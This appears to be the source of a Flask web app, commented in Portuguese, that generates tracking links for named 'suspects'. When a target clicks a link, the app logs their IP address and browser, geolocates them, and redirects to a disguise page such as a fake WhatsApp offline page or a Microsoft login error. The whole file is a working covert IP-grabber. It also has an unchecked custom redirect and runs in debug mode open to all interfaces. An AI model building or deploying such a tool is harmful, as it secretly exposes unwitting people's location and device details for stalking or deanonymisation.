from flask import Flask, render_template, request, jsonify, redirect, url_for
from datetime import datetime
import uuid
import requests
from user_agents import parse as parse_ua  # pip install pyyaml ua-parser user-agents

app = Flask(__name__)

# “Banco” em memória
SUSPECTS_DB = {}

def get_geo_data(ip):
    try:
        r = requests.get(f'https://ipapi.co/{ip}/json/', timeout=3)
        if r.status_code == 200:
            return r.json()
    except:
        pass
    return {}

def parse_user_agent(ua_string):
    try:
        ua = parse_ua(ua_string)
        return (
            f"{ua.browser.family} {ua.browser.version_string}",
            f"{ua.os.family} {ua.os.version_string}"
        )
    except:
        return "–", "–"

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/track/<token>')
def track(token):
    suspect = SUSPECTS_DB.get(token)
    if suspect:
        suspect['last_access'] = datetime.now()
        suspect['ip']         = request.remote_addr
        suspect['user_agent'] = request.headers.get('User-Agent')
    return render_template('track.html', token=token)

@app.route('/go/<token>')
def go_redirect(token):
    # Qual disfarce usar?
    preset     = request.args.get("preset", "blank")
    custom_url = request.args.get("custom", "").strip()

    # Se token inválido, volta à home
    if token not in SUSPECTS_DB:
        return redirect(url_for('index'))

    # Registra acesso antes de redirecionar
    suspect = SUSPECTS_DB[token]
    suspect['last_access'] = datetime.now()
    suspect['ip']         = request.remote_addr
    suspect['user_agent'] = request.headers.get('User-Agent')

    # Mapeia presets para URLs externas
    preset_urls = {
        "404":            "https://example.com/nothing-here",
        "whatsapp":       "https://web.whatsapp.com/offline",
        "youtube_error":  "https://www.youtube.com/error_page",
        "google_expired": "https://www.google.com/sorry/index",
        "login_failed":   "https://login.live.com/error",
        "instagram_down": "https://www.instagram.com/unavailable",
        "twitter_offline":"https://twitter.com/offline",
        "blank":          "https://www.google.com/blank.html",
    }

    # Se for custom e URL válida, manda para ela
    if preset == "custom" and custom_url:
        return redirect(custom_url)

    # Se for layout interno, mostra spinner e depois vai para /track
    if preset == "layout":
        return render_template(
            'redirect.html',
            preset="layout",
            target_url=url_for('track', token=token)
        )

    # Caso contrário, redireciona imediatamente para a URL mapeada
    target = preset_urls.get(preset, preset_urls["blank"])
    return redirect(target)

@app.route('/redirect/<token>')
def redirect_intermediate(token):
    # Mantém rota para uso programático, mas /go é nossa rota principal
    preset = request.args.get("preset", "layout")
    if token not in SUSPECTS_DB:
        return render_template('redirect.html', preset='404', target_url=url_for('index'))
    return render_template(
        'redirect.html',
        preset=preset,
        target_url=url_for('track', token=token)
    )

@app.route('/api/suspects')
def api_suspects():
    return jsonify([
        {
            "token":      t,
            "name":       d.get("name"),
            "created_at": d["created_at"].isoformat()
        }
        for t, d in SUSPECTS_DB.items()
    ])

@app.route('/api/suspect/<token>')
def api_suspect(token):
    s = SUSPECTS_DB.get(token)
    if not s:
        return jsonify({"error": "Token não encontrado"}), 404

    ip        = s.get("ip") or request.remote_addr
    ua_string = s.get("user_agent", "")
    browser, platform = parse_user_agent(ua_string)
    geo       = get_geo_data(ip)

    return jsonify({
        "name":       s.get("name", "–"),
        "message":    s.get("message", "Clique aqui"),
        "ip":         ip,
        "city":       geo.get("city", "–"),
        "region":     geo.get("region", "–"),
        "country":    geo.get("country_name", "–"),
        "latitude":   geo.get("latitude"),
        "longitude":  geo.get("longitude"),
        "browser":    browser,
        "platform":   platform,
        "created_at": s["created_at"].isoformat(),
        "last_access": s["last_access"].isoformat() if s["last_access"] else None,
        "token":      token
    })

@app.route('/api/new-track', methods=['POST'])
def api_new_track():
    data    = request.get_json() or {}
    name    = data.get("name", "").strip() or None
    message = data.get("message", "").strip() or "Clique aqui"

    # Gera slug único
    slug = str(uuid.uuid4())[:8]
    while slug in SUSPECTS_DB:
        slug = str(uuid.uuid4())[:8]

    SUSPECTS_DB[slug] = {
        "name":        name,
        "message":     message,
        "created_at":  datetime.now(),
        "last_access": None,
        "ip":          None,
        "user_agent":  None
    }

    return jsonify({
        "url":     f"/track/{slug}",
        "message": message
    })

@app.route('/api/suspect/<token>', methods=['DELETE'])
def api_delete_suspect(token):
    if token not in SUSPECTS_DB:
        return jsonify({"error": "Token não encontrado"}), 404
    del SUSPECTS_DB[token]
    return jsonify({"detail": "Suspeito removido com sucesso"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', debug=True)